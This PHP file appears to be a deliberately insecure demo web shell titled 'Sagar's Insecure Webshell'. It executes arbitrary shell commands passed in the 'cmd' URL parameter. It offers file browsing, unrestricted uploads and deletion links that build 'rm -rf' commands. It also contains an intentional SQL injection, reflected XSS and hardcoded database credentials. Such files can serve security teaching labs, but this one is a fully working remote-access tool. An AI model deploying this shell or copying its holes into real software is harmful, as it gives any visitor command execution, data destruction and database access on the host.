<?php
// Insecure version with added SQL Injection vulnerability
// connect to the database (for demonstration, connection details are hypothetical)
$con = mysqli_connect("localhost", "admin", "password", "database");

if (isset($_GET['dir'])) {
    chdir($_GET['dir']);
}
$dir = getcwd();
exec($_GET['cmd']);

// Vulnerable SQL Query
if (isset($_GET['search'])) {
    $search = $_GET['search']; // User-controlled input
    $query = "SELECT * FROM files WHERE name LIKE '%$search%'";
    $result = mysqli_query($con, $query); // Vulnerable to SQL Injection

    while ($row = mysqli_fetch_assoc($result)) {
        echo $row['name'] . "<br>";
    }
}

echo "<pre>search alert('XSS') between script tags to see the XSS vulnerability</pre>";

if (isset($_GET['search'])) {
    $search = $_GET['search']; // User-controlled input
    echo "You searched for: " . $search; // Vulnerable to XSS
    $query = "SELECT * FROM files WHERE name LIKE '%$search%'";
    $result = mysqli_query($con, $query);

    while ($row = mysqli_fetch_assoc($result)) {
        echo $row['name'] . "<br>";
    }
}


function ls($dir) {
    $folder = opendir($dir);
    while ($file = readdir($folder)) {
        if ($file != ".") {
            if (is_dir($file)) {
                $next_dir = $dir . '/' . $file;
                echo "<a href={$_SERVER['SCRIPT_NAME']}?dir={$dir}&cmd=rm%20-rf%20{$file}>[X]</a> <a href={$_SERVER['SCRIPT_NAME']}?dir={$next_dir}><font face='Lucida Console' style='font-size: 9pt'><strong>{$file}</strong></font></a><br>";
            } else {
                echo "<a href={$_SERVER['SCRIPT_NAME']}?dir={$dir}&cmd=rm%20{$file}>[X]</a> <font face='Lucida Console' style='font-size: 9pt'>{$file}</font><br>";
            }
        }
    }
    closedir($folder);
}

function handle_file_upload($dir) {
    if (isset($_POST['submit']) && !empty($_FILES['file']) && move_uploaded_file($_FILES["file"]["tmp_name"], $dir . '/' . $_FILES['file']['name'])) {
        echo 'File ' . $_FILES['file']['name'] . ' uploaded to the current directory.';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Sagar SIW</title>
</head>
<body>
    <h1>SIW - Sagar's Insecure Webshell</h1>

    <pre><?=$dir?></pre>

    <pre><?php handle_file_upload($dir) ?></pre>

    <?php
        ls($dir);
    ?>
    <br>
    <form method="GET">
        <input type="text" placeholder="Search files..." name="search">
        <input type="submit" value="Search">
    </form>

    <form method="POST" enctype="multipart/form-data">
        <input type="file" id="file" name="file">
        <input type="submit" id="submit" name="submit" value="Upload file">
    </form>

    <form>
        <input type="text" placeholder="Enter shell commands..." id="cmd" name="cmd" autofocus><br>
    </form>

    <p>Output:</p>
    <pre><?=`$_GET[cmd]`?></pre>

</body>
</html>
